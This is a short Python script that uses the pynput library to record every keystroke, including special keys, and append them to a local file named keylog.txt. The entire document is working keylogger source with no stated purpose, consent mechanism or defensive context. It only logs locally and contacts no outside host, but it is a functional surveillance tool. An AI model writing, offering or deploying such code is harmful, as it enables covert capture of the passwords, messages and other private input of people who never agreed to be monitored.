from pynput.keyboard import Key, Listener

log_file = "keylog.txt"  # File where keystrokes will be saved

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f"[{key}]")

# Start listening for keystrokes
with Listener(on_press=on_press) as listener:
    listener.join()

